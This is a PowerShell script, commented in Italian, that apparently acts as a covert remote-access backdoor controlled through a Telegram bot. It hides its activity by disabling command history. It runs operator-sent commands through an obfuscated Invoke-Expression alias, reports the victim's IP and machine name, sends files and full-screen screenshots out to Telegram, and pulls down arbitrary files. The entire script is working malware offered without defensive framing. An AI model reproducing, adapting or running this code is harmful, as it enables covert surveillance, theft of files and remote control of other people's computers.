Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE
$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id, $api_token    = "@1", "@2"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
$api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
$api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
$session_id                 = $env:COMPUTERNAME
$Global:ProgressPreference  = 'SilentlyContinue'

function CheckAdminRights
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) { return ("L'utente '$env:USERNAME' ha i privilegi di amministratore") } 
    else { return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore") }
}

function DownloadFile($file_id, $file_name)
{
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
    if (Test-Path -Path $file_name) { SendMessage "File scaricato con successo" } 
    else { SendMessage "Il file non è stato scaricato" }
}

function SendFile($filePath) 
{
    SendMessage "Procedo ad inviare il file [$($filePath)]"
    if (Test-Path -Path $filePath -PathType Leaf) {
        try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null } 
        catch { SendMessage "Errore durante l'upload del file: [$($Error[0])]" }
    } 
    else { SendMessage "Il file indicato non è stato trovato" }
}

function SendScreenshot
{
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $left = [Int32]::MaxValue
    $top = [Int32]::MaxValue
    $right = [Int32]::MinValue
    $bottom = [Int32]::MinValue
    foreach ($screen in [Windows.Forms.Screen]::AllScreens)
    {
        if ($screen.Bounds.X -lt $left) { $left = $screen.Bounds.X; }
        if ($screen.Bounds.Y -lt $top) { $top = $screen.Bounds.Y; }
        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right) { $right = $screen.Bounds.X + $screen.Bounds.Width; }
        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height; }
    }
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom);
    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
    $bmp.Save("$env:APPDATA\screenshot.png");
    $graphics.Dispose();
    $bmp.Dispose();
    SendFile "$env:APPDATA\screenshot.png"
    Remove-Item -Path "$env:APPDATA\screenshot.png" -Force
}

function SendMessage($output, $cmd)
{
    # To escape _*``[\
    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"

    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`SESSION ID: $session_id`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
    }

    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
    } catch { Start-Sleep -Seconds 3 }
}

function TestTelegramAPI {
    try { 
        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 3 -ErrorAction Stop | Out-Null
        return $true 
    } 
    catch { return $false }
}

function CommandListener
{
    $offset = 0
    
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position

    $PreviousStatus = $null

    while ($true) {
        try {
            $CurrentStatus = TestTelegramAPI
            if ($CurrentStatus -ne $PreviousStatus) {
                if ($CurrentStatus) { SendMessage "Computer online" }
                $PreviousStatus = $CurrentStatus
            }
            
            Start-Sleep -Milliseconds 1000
            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
                if ($offset -eq 0) { 
                    $offset = $message.result.Count
                    Start-Sleep -Seconds 1
                    continue 
                }
                
                $offset     = $message.result.Count
                $message    = $message.result.Message[-1]
                $user_id    = $message.chat.id
                $username   = $message.chat.username
                $text       = $message.text
                $document   = $message.document
                $sid        = $text.Split(" ")
                $text       = $sid[1..($sid.Length - 1)] -join " "

                if ($user_id -notmatch $telegram_id) {
                    $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
                    SendMessage $unauth_user_found
                }

                if ($text -match "/online")          { SendMessage "Sessione operativa" $text }
                if ($sid[0] -notmatch $session_id)   { continue }
                if ($text -match "exit")             { SendMessage "Sessione chiusa" $text; exit }

                if ($text.Length -gt 0) {
                    try {
                        $change_location_check = $text -split ' ' | Select-Object -First 1
                        if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                        $output = .(Get-Alias ?e[?x])($text) | Out-String
                    } 
                    catch { $output = $Error[0] | Out-String }

                    $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
                        $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                    }

                    foreach ($block in $output_splitted) { 
                        $block = $block | Out-String
                        SendMessage $block $text
                        Start-Sleep -Milliseconds 100
                    }

                    if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
                }
                if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
            }
        } catch { Start-Sleep -Seconds 5 }
    }
    $session.Dispose()
}

# Avvia la funzione principale per ascoltare i comandi
CommandListener
